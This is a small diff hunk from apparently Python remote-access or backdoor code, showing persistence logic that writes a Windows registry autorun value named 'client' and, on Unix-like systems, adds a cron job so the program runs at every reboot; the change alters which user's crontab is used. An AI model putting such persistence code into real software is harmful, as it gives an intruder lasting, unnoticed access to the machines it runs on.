@@ -143,7 +143,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 SetValueEx(key, 'client', 0, REG_SZ, exe)
                 key.Close()
             else:  # We're on a *nix system, try Cron
-                cron = CronTab(user='root')
+                cron = CronTab(user=user)
                 reboot = '@reboot ' + exe  # Make our script run on reboot
                 job = cron.new(command=exe)
 
